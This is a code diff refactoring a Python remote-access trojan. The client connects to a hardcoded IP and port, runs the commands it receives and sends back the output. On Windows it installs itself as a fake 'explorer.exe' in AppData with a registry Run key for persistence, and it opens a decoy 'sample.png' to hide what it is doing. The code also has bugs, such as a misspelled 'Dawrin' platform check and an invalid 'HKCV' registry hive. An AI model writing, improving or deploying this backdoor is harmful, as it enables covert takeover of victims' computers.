@@ -12,35 +12,29 @@ from typing import NamedTuple, List
 from json import dumps, loads
 
 
-class Environment(NamedTuple):
-    platform: str
-    release: str
-
-
 class Client(object):
-    def __init__(self, env: 'Environment' = Environment('',''), ip: str = '', port: int = ''):
-        self.env = env
+    def __init__(self, platform: str = '', release: str = '', ip: str = '', port: int = ''):
+        self.env = f'{platform}: {release}'
+        self.release = release
         self.connection = socket(AF_INET, SOCK_STREAM)
         self.connection.connect((ip, port))
 
     def become_persistent(self):
-        platform = f'{system()}: {release()}'
-        if 'Windows' in self.env.platform:
+        if 'Windows' in self.env:
             file_loc = environ["appdata"] + "\\explorer.exe"
             if not path.exists(file_loc):
                 copyfile(sys.executable, file_loc)
                 call([
                     f'reg add',
-                    f'HKCV\Software\Microsoft\Windows\CurrentVersion\Run',
+                    f'HKCV\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                     f'/v name',
                     f'/t REG_SZ',
                     f'/d "{file_loc}"']
                 )
-        if 'Linux' in self.env.platform:
+        if 'Linux' in self.env:
             raise NotImplementedError('TODO')
-        if 'Darwin' in self.env.platform:
+        if 'Darwin' in self.env:
             raise NotImplementedError('TODO')
-        
 
     def send(self, data: bytes) -> None:
         json_data = dumps(data)
@@ -90,21 +84,21 @@ class Client(object):
                     result = self.exec(cmd).decode()
             except Exception as e:
                 result = f'[-] Error occured during cmd exec: \n\t{e}'
-            print(result)
             self.send(result)
 
 
-def open_front_file(file_path, env):
-    if 'Linux' in env.platform:
+def open_front_file(file_path: Path, env: str):
+    if 'Linux' in env:
         run(['xdg-open', file_path], check=True)
-    elif 'Windows' in env.platform:
+    elif 'Windows' in env:
         run(['open', file_path], check=True)
-    elif 'Dawrin' in env.platform:
+    elif 'Dawrin' in env:
         run(['open', file_path], check=True)
 
 
 def main(*args, **kwargs) -> None:
-    env = Environment(platform=system(), release=release())
+    platform, version = system(), release()
+    env = f'{system()}: {release()}'
     file_name = 'sample.png'
     if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
         file_path = Path(sys._MEIPASS) # pylint: disable=no-member
@@ -115,7 +109,7 @@ def main(*args, **kwargs) -> None:
     open_front_file(front_file, env)
 
     try:
-        client = Client(env, '10.0.2.15', 7777)
+        client = Client(platform, version, '10.0.2.15', 7777)
         client.run()
     except Exception as e:
         sys.exit()
